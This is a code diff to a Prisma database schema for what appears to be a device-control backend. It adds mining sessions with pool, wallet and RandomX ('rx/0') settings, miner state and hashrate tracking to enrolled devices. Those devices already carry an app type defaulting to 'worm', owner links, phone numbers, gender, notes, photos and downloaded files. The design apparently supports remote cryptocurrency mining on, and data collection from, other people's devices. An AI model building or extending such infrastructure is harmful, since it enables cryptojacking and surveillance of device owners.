@@ -37,16 +37,69 @@ enum AppType {
   master
 }
 
+enum Platform {
+  ANDROID
+  WINDOWS
+  LINUX
+  MACOS
+}
+
+enum MinerState {
+  STOPPED
+  STARTING
+  RUNNING
+  STOPPING
+  ERROR
+}
+
+/// Server-issued, single-use enrollment proof (JWT jti). 30-min TTL.
+model EnrollToken {
+  id         String    @id @default(uuid())
+  jti        String    @unique
+  deviceId   String?   @map("device_id")
+  consumedAt DateTime? @map("consumed_at")
+  expiresAt  DateTime  @map("expires_at")
+  createdAt  DateTime  @default(now()) @map("created_at")
+
+  @@map("enroll_tokens")
+}
+
+/// One mining run on a device; lifecycle mirrors MinerState transitions.
+model MiningSession {
+  id         String    @id @default(uuid())
+  deviceId   String    @map("device_id")
+  algo       String    @default("rx/0")
+  pool       String    @default("")
+  wallet     String    @default("")
+  threads    Int       @default(1)
+  startedAt  DateTime  @default(now()) @map("started_at")
+  stoppedAt  DateTime? @map("stopped_at")
+  stopReason String?   @map("stop_reason")
+  device     Device    @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+
+  @@index([deviceId, startedAt])
+  @@map("mining_sessions")
+}
+
 model Device {
   id             String    @id @default(uuid())
   ownerId        String    @map("owner_id")
   name           String
   phone          String
-  platform       String
+  platform       Platform  @default(ANDROID)
   variant        String    @default("standard")
   appType        AppType   @default(worm) @map("app_type")
   enrollTokenHash String   @map("enroll_token_hash")
   deviceTokenHash String   @map("device_token_hash")
+  /// SHA-256 digest of the random per-device credential (phase-1 path).
+  credentialHash String?   @map("credential_hash")
+  displayName    String?   @map("display_name")
+  /// AES-256-GCM ciphertext of the E.164 phone; plaintext never persists.
+  phoneEnc       String?   @map("phone_enc")
+  phoneMasked    String?   @map("phone_masked")
+  minerState     MinerState @default(STOPPED) @map("miner_state")
+  /// Ring of recent hashrate samples (agent-reported, ≤120 entries).
+  lastHashrate   Json?     @map("last_hashrate")
   status         String    @default("offline")
   gender         String    @default("")
   notes          String    @default("")
@@ -61,6 +114,7 @@ model Device {
   photos         DevicePhoto[]
   downloads      DownloadedFile[]
   auditEvents    AuditEvent[]
+  miningSessions MiningSession[]
 
   @@index([ownerId])
   @@index([enrollTokenHash])
